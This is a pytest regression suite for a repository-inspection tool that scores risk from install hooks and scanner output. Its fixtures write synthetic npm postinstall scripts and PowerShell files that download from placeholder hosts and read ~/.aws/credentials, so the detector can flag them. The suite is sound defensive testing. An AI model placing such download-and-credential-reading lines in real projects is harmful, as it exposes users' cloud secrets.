"""Regressions found during the pre-merge review; all scanner evidence here is synthetic."""

import json
import subprocess
import sys
from dataclasses import asdict
from unittest.mock import patch

import pytest

from safeshell.cli import main
from safeshell.inspection.adapters import OSV, Trivy
from safeshell.inspection.decision import deduplicate
from safeshell.inspection.engine import inspect_repository
from safeshell.inspection.models import EngineResult, Finding


class Empty:
    def __init__(self, source):
        self.source = source

    def scan(self, target, cache):
        return EngineResult(self.source, "COMPLETE")


def complete_engines():
    return [Empty(source) for source in ("Trivy", "OSV-Scanner", "YARA-X", "Scorecard")]


def write(root, name, text):
    path = root / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def test_native_only_is_incomplete_even_without_findings(tmp_path):
    report = inspect_repository(tmp_path, [])
    assert not report["findings"]
    assert report["verdict"]["verdict"] == "UNKNOWN"
    assert not report["coverage"]["complete"]
    assert len(report["verdict"]["disabled_scanners"]) == 4
    complete = inspect_repository(tmp_path, complete_engines())
    assert complete["verdict"]["verdict"] == "LOW RISK"
    assert "not mean guaranteed safe" in complete["verdict"]["primary_reasons"][0]


def test_disable_scanner_never_launches_and_exports_state(tmp_path, monkeypatch, capsys):
    args = ["safeshell", "inspect", str(tmp_path), "--json"]
    for name in ("trivy", "osv", "yara-x", "scorecard"):
        args.extend(["--disable-scanner", name])
    monkeypatch.setattr(sys, "argv", args)
    with patch("subprocess.Popen", side_effect=AssertionError("disabled engine launched")):
        assert main() == 0
    report = json.loads(capsys.readouterr().out)
    assert report["verdict"]["verdict"] == "UNKNOWN"
    assert {e["status"] for e in report["engines"][1:]} == {"DISABLED"}


@pytest.mark.parametrize("outcome", ["missing", "timeout", "invalid-json", "invalid-field"])
def test_incomplete_scanner_cannot_yield_low_risk(tmp_path, outcome):
    if outcome == "missing":
        discovery = patch("shutil.which", return_value=None)
        runner = patch(
            "safeshell.inspection.adapters.bounded_run",
            side_effect=AssertionError("must not launch"),
        )
    else:
        discovery = patch("shutil.which", return_value=sys.executable)
        raw = b'{"results":[{"source":{"path":{}},"packages":[{"package":{"name":"x"},"vulnerabilities":[{"id":"test"}]}]}]}'
        second = (
            subprocess.TimeoutExpired("scanner", 60)
            if outcome == "timeout"
            else (0, raw if outcome == "invalid-field" else b"{", b"")
        )
        runner = patch(
            "safeshell.inspection.adapters.bounded_run", side_effect=[(0, b"v2", b""), second]
        )
    with discovery, runner:
        report = inspect_repository(tmp_path, [OSV()])
    result = next(e for e in report["engines"] if e["source"] == "OSV-Scanner")
    assert result["status"] in {"PARTIAL", "UNAVAILABLE"}
    assert report["verdict"]["verdict"] == "UNKNOWN"
    assert not report["coverage"]["complete"]
    if outcome.startswith("invalid"):
        assert result["exit_code"] == 0


def test_manual_sibling_signals_are_not_attributed_to_install(tmp_path):
    write(
        tmp_path,
        "package.json",
        json.dumps(
            {
                "scripts": {
                    "postinstall": "curl https://example.invalid/one",
                    "test": "curl https://example.invalid/two && cat ~/.aws/credentials",
                }
            }
        ),
    )
    report = inspect_repository(tmp_path, complete_engines())
    assert report["verdict"]["verdict"] == "CAUTION"
    assert not report["correlations"]
    manual_download = next(
        f
        for f in report["findings"]
        if f["category"] == "external_download" and "/two" in f["evidence"]
    )
    assert not manual_download["execution_relevant"]


@pytest.mark.parametrize("body", ['echo "research.ps1"', "# powershell research.ps1\necho done"])
def test_filename_in_data_or_comment_is_not_an_invocation(tmp_path, body):
    write(tmp_path, "package.json", json.dumps({"scripts": {"postinstall": body}}))
    write(
        tmp_path,
        "research.ps1",
        "Invoke-WebRequest https://example.invalid/a\nGet-Content ~/.aws/credentials",
    )
    report = inspect_repository(tmp_path, complete_engines())
    assert report["verdict"]["verdict"] == "CAUTION"
    assert not any(
        f["execution_relevant"] for f in report["findings"] if f["file"] == "research.ps1"
    )


def test_inline_comment_does_not_make_download_a_credential_chain(tmp_path):
    write(tmp_path, "package.json", '{"scripts":{"postinstall":"node setup.js"}}')
    write(tmp_path, "setup.js", 'fetch("https://example.invalid/a"); // .aws')
    report = inspect_repository(tmp_path, complete_engines())
    assert not any(f["category"] == "sensitive_access" for f in report["findings"])
    assert report["verdict"]["verdict"] == "CAUTION"


def test_npm_chain_has_real_lines_and_preserves_counts(tmp_path):
    text = '{\n  "scripts": {\n    "postinstall": "npm run bootstrap",\n    "bootstrap": "powershell setup.ps1"\n  }\n}\n'
    write(tmp_path, "package.json", text)
    write(
        tmp_path,
        "setup.ps1",
        "Invoke-WebRequest https://example.invalid/a\nGet-Content ~/.aws/credentials",
    )
    report = inspect_repository(tmp_path, complete_engines())
    assert report["verdict"]["verdict"] == "HIGH RISK"
    hooks = {f["title"]: f for f in report["findings"] if f["category"] == "execution"}
    assert hooks["npm postinstall"]["line"] == 3
    assert hooks["npm bootstrap"]["line"] == 4
    assert report["engines"][0]["finding_count"] == len(report["findings"])
    ids = {node["id"] for node in report["execution_graph"]["nodes"]}
    assert all(
        e["source"] in ids and e["target"] in ids for e in report["execution_graph"]["edges"]
    )
    for finding in report["findings"]:
        assert finding["line"] is not None
        assert finding["line"] <= len((tmp_path / finding["file"]).read_text().splitlines())


def test_child_process_does_not_inherit_its_source_directory_as_cwd(tmp_path):
    write(tmp_path, "package.json", '{"scripts":{"postinstall":"node scripts/setup.js"}}')
    write(tmp_path, "scripts/setup.js", 'spawn("powershell", ["setup.ps1"]);')
    write(
        tmp_path,
        "scripts/setup.ps1",
        "Invoke-WebRequest https://example.invalid/a\nGet-Content ~/.aws/credentials",
    )
    report = inspect_repository(tmp_path, complete_engines())
    assert report["verdict"]["verdict"] == "UNKNOWN"
    assert not report["correlations"]


def test_malformed_literal_subprocess_command_is_a_gap_not_a_crash(tmp_path):
    write(tmp_path, "script.py", 'import subprocess\nsubprocess.run("echo \'")\n')
    report = inspect_repository(tmp_path, complete_engines())
    assert report["verdict"]["verdict"] == "UNKNOWN"
    assert any("unsupported process" in gap for gap in report["coverage"]["gaps"])


@pytest.mark.parametrize(
    "command",
    [
        'subprocess.run(["powershell", "setup.ps1"], cwd="elsewhere")',
        'subprocess.run(["powershell", "setup.ps1"], **options)',
    ],
)
def test_dynamic_cwd_does_not_create_a_proven_root_file_edge(tmp_path, command):
    write(tmp_path, "package.json", '{"scripts":{"postinstall":"python start.py"}}')
    write(tmp_path, "start.py", command)
    write(
        tmp_path,
        "setup.ps1",
        "Invoke-WebRequest https://example.invalid/a\nGet-Content ~/.aws/credentials",
    )
    report = inspect_repository(tmp_path, complete_engines())
    assert report["verdict"]["verdict"] == "UNKNOWN"
    assert not report["correlations"]


def test_real_tool_ecosystem_alias_and_evidence_location_survive_deduplication():
    def finding(source, ecosystem, line):
        return Finding(
            "",
            source,
            "vulnerability",
            "HIGH",
            "HIGH",
            "requests advisory",
            file="requirements.txt",
            line=line,
            identifiers=["CVE-2018-18074"],
            package="requests",
            installed_version="2.19.0",
            metadata={"ecosystem": ecosystem},
        )

    result, duplicates = deduplicate(
        [finding("Trivy", "pip", 1), finding("OSV-Scanner", "PyPI", 2)]
    )
    assert duplicates == 1 and len(result) == 1
    assert result[0].metadata["additional_evidence"][0]["line"] == 2


def test_trivy_iac_line_and_no_raw_secret():
    result = Trivy().normalize(
        {
            "Results": [
                {
                    "Target": "Dockerfile",
                    "Misconfigurations": [
                        {
                            "ID": "DS002",
                            "Title": "No non-root user",
                            "CauseMetadata": {"StartLine": 2},
                        }
                    ],
                }
            ]
        }
    )
    assert asdict(result[0])["line"] == 2


def test_inspection_input_error_is_json_and_nonzero(tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(
        sys, "argv", ["safeshell", "inspect", str(tmp_path / "missing"), "--format", "json"]
    )
    assert main() == 2
    assert json.loads(capsys.readouterr().out)["exit_code"] == 2


@pytest.mark.parametrize("name", ["package.json", "setup.ps1"])
def test_unreadable_execution_encoding_is_not_complete_coverage(tmp_path, name):
    (tmp_path / name).write_bytes(b"\x80\x81\x00")
    report = inspect_repository(tmp_path, complete_engines())
    assert report["verdict"]["verdict"] == "UNKNOWN"
    assert not report["coverage"]["complete"]


def test_powershell_utf16_bom_and_uppercase_suffix_are_inspected(tmp_path):
    write(tmp_path, "package.json", '{"scripts":{"postinstall":"powershell SETUP.PS1"}}')
    (tmp_path / "SETUP.PS1").write_bytes(
        "Invoke-WebRequest https://example.invalid/a\nGet-Content ~/.aws/credentials".encode(
            "utf-16"
        )
    )
    report = inspect_repository(tmp_path, complete_engines())
    assert report["verdict"]["verdict"] == "HIGH RISK"
    assert {f["line"] for f in report["findings"] if f["file"] == "SETUP.PS1"} == {1, 2}
